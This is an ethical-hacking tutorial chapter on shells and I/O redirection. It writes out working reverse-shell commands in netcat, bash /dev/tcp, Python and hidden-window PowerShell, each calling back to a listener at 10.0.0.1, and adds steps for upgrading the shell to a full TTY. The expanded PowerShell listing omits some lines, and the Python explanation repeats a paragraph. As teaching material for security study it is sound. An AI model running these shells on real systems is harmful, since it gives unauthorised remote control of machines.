# Shells

Although there are graphical user interface \(GUI\) based applications that perform a large number of the functions involved in ethical hacking, you will end up spending a great deal of time typing commands at a command line prompt in a “shell”. The shell itself is a program that accepts commands to interact with the operating system of the computer and other programs. There are a variety of shells with the two most common shells on Linux being the Bourne shell or “sh” and the Bourne again shell “bash”. On Apple’s macOS the default shell now in the terminal program is the “zsh”. On Windows, there are a variety of command-line programs. There is the original command program “cmd.exe”, “powershell.exe” which is the PowerShell interpreter and the Linux Terminal which interfaces with the Windows Subsystem for Linux \(WSL\). Microsoft has also released an Open Source Windows Terminal.

An important consideration for our purposes is the way shells handle input, output and errors. All programs communicate over the communication channels, referred to as the standard streams stdin \(standard in\), stdout \(standard out\) and stderr \(standard error\). As with all things on Linux, these streams are treated as files and have a number that identifies them, the file descriptor. In the case of the standard streams, the file descriptors \(fd\) are:

```text
stdin  0
stdout 1
stderr 2
```

Theses streams can be redirected by using the “&gt;” notation. For example, to redirect output and error messages to a single file, you can use the command:

`ls 2>&1 output.txt`

Likewise, stdin can be redirected by using the “&lt;” redirection symbol. A trivial example is using “cat” to display the contents of a file hello.txt which contains “hello”

```bash
┌─[✗]─[rin@parrot]─[~/]
└──╼ $cat < hello.txt
hello
```

Other than being a convenience, the ability to redirect the standard streams becomes important when trying to run a shell on a remote machine, something that is often the key of gaining control over a machine. Since the standard streams can be redirected, they can be redirected over network sockets that transport the data over a network. The idea is depicted in the following diagram:

![Principles of a remote shell redirecting stdin, stdout and stderror over a network socket](../.gitbook/assets/0%20%282%29.png)

This entire process is made simpler through the use of a program called Netcat that can handle the IO redirection for a program over a network. In what is called a “reverse shell”, you start a Netcat session on a local machine to listen for incoming connections:

`nc -lvnp 6001`

This tells netcat to listen \(-l\) on port \(-p\) 6001 \(any number port that is not being used\) on all IP addresses for incoming connections \(-v is for verbose output, -n is for no DNS\). On the target machine, you can run:

`nc <listen machine IP> 6001 -e /bin/bash`

This will execute bash and send all IO to the listening machine.

An alternative to reverse shells are “bind shells”. In this case the process listens on the attacking machine and the attacker initiates the connection from the attacking machine. The commands are the same but reversed.

Netcat is one tool to create a reverse shell. There are numerous other ways of achieving the same result of handling the standard streams. Another common and useful way of sending a reverse shell is by using built in networking functions of bash.

`bash -i >& /dev/tcp/10.0.0.1/6001 0>&1`

Although this looks complicated, it is running a bash shell in interactive mode \(-i\) and redirecting stdout and stderr \(&gt;&\) to a socket that will connect to the address and port specified \(/dev/tcp/10.0.0.1/6001\). The final redirection command \(0&gt;&1\) redirects stdin to the same file as stdout i.e. the socket.

At the other end, you can still use Netcat in listening mode to handle the incoming connection.

There are a range of ways of running reverse shells in different languages listed on sites like PayloadsAllTheThings[\[1\]](shells.md). An example of a reverse shell written in Python is

```bash
python3 -c 'import socket,subprocess, os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",6001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

Expanded, the code looks like this:

```python
import socket,subprocess, os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",6001))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
```

The code essentially replicates the process of making the bash socket connection you saw earlier. It creates a socket u and connects to the listener v. It redirects the stdin, stdout and stderror to the socket w and then makes then runs the bash command x. It then gets all of the standard streams using the socket and finally starts an interactive shell.

The code essentially replicates the process you saw above with the bash socket connection. It creates a socket and connects to the listener. It then gets all of the standard streams using the socket and finally starts an interactive shell.

## Reverse shells on Windows

The principles of reverse shells work with Windows as well but you don’t have the ease of having bash readily available. There are Windows' versions of Netcat and so it is possible to do a reverse shell by simply specifying cmd.exe or powershell.exe as the command to execute when using it. It is also possible, as in the Python example above, to run a reverse shell written in PowerShell as follows:

```bash
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",6001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

When the code passed to powershell.exe's command argument \(-Command\) is expanded, it looks like this:

```python
New-Object System.Net.Sockets.TCPClient("10.0.0.1",6001)
$stream = $client.GetStream()
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
  $sendback = (iex $data 2>&1 | Out-String )
  $sendback2  = $sendback + "PS " + (pwd).Path + "> "
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
}
$client.Close()
```

The script creates a socket to communicate with the attacker's listener u, creates a buffer to read v from that socket which will be commands sent by the attacker w, executes the commands sent by the attacker x and gets the response and then writes the response back to the attacker y.

As with all things Windows, this is slightly more complicated than the Linux versions but functional, nonetheless. Another alternative is to use a “Meterpreter” shell that is designed to work with the pentesting framework Metasploit which you will discuss shortly.

## Upgrading Remote Shells

The shells obtained by the methods outlined sometimes are less than functional because they do not result in a full ‘TTY’ terminal. TTY stands for teletype and is derived from the early electromagnetic typewriters that were used in telegraphy and then to communicate with mainframes and minicomputers. When you open a terminal on a Mac or on Linux, the terminal software is running a pseudo teletype \(PTY\) which handles getting input from the keyboard and passing it to a TTY driver which eventually passes that data to which ever shell program you are running. The terminal handles things like arrow keys and key sequences like "control + w" which will erase a word, "control + c" which will kill the last command you ran. If you are not running a proper TTY, you won't be able to use arrow keys and "CTL+c" will kill the shell you are running and not the last command. Also using an editor like vi will be difficult.

Shells can be upgraded by using the pty library in python:

```bash
python3 -c ‘import pty;pty.spawn(“/bin/bash”);’
```

Then typing CTL+z to background the process and typing

```bash
stty raw -echo
fg
hit enter key
hit enter key
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

